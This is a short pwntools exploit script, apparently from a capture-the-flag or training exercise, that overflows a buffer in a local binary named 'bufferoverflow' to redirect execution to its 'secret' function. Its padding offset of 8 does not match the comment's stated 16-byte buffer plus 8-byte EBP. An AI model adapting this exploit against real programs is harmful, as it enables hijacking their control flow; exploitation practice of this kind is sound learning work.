from pwn import *

elf =  ELF('./bufferoverflow')
rop = ROP(elf)
offset = 8
addr_function = elf.symbols['secret']
print(hex(addr_function))

payload = flat(
    b'A' * offset, # 16 size du buffer + 8 EBP 
    addr_function
)

print(payload)

io = elf.process()

io.sendline(payload)
io.interactive()
